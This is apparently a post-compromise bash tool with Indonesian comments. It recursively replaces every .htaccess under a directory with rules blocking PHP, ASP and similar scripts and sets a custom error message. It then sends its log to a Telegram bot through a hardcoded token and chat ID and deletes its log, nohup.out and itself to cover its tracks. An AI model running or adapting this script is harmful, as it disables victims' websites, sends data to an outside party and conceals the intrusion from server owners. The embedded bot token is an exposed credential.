#!/bin/bash

# Periksa parameter direktori
if [ "$#" -ne 1 ]; then
  echo "Usage: $0 /path/to/directory"
  exit 1
fi

# Direktori yang akan di-scan
TARGET_DIR=$1
# Tentukan lokasi file log berdasarkan lokasi skrip ini
LOG_FILE="$(dirname "$0")/logfile.log"
SCRIPT_PATH="$0"
NOHUP_FILE="$(dirname "$0")/nohup.out"
TELEGRAM_TOKEN="6849508672:AAHqCtNI4lsew9D-MqWsETULhzmwwTPn39A"
CHAT_ID="-1002137132938"

# Fungsi untuk mengirim file log ke Telegram
send_telegram_logfile() {
    echo "Sending logfile to Telegram..." >> "$LOG_FILE"
    curl -F "chat_id=$CHAT_ID" \
         -F "document=@$LOG_FILE" \
         -F "caption=Log File" \
         "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument"
    echo "Logfile sent." >> "$LOG_FILE"
}

# Fungsi untuk memodifikasi atau menambahkan .htaccess
update_htaccess() {
  local dir="$1"

  # Cek apakah direktori bisa diakses
  if [ ! -d "$dir" ] || [ ! -w "$dir" ]; then
    echo "Directory $dir cannot be accessed or is not writable. Skipping..." >> "$LOG_FILE"
    return
  fi

  # Backup dan hapus .htaccess yang ada
  if [ -f "$dir/.htaccess" ]; then
    cp "$dir/.htaccess" "$dir/.htaccess.bak"
    if ! rm -rf "$dir/.htaccess"; then
      local msg="$(date) - Failed to delete .htaccess in $dir. It may be protected or require higher permissions."
      echo "$msg" >> "$LOG_FILE"
      return
    fi
  fi

  # Tambahkan file .htaccess baru
  cat > "$dir/.htaccess" << 'EOF'
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.a*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.S*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.s*>
    Order Deny,Allow
    Deny from all
</Files>

Options -Indexes
ErrorDocument 403 "Error?!: G"
ErrorDocument 404 "Error?!: G"
EOF
  chmod 644 "$dir/.htaccess"
}

export -f update_htaccess
export LOG_FILE
export TELEGRAM_TOKEN
export CHAT_ID

# Hapus file log sebelumnya jika ada
rm -f "$LOG_FILE"

# Gunakan find dan xargs untuk paralel eksekusi
find "$TARGET_DIR" -type d \( -name '.*' -o -name '*' \) -print0 | xargs -0 -n 1 -P 20 -I {} bash -c 'update_htaccess "{}"'

# Setelah semua proses selesai, kirim file log jika ada isinya
if [ -s "$LOG_FILE" ]; then
    send_telegram_logfile
fi

# Tunggu sedikit untuk pastikan pesan Telegram terkirim
sleep 5

# Hapus file log, nohup.out, dan skrip itu sendiri
rm -f "$LOG_FILE" "$NOHUP_FILE" "$SCRIPT_PATH"
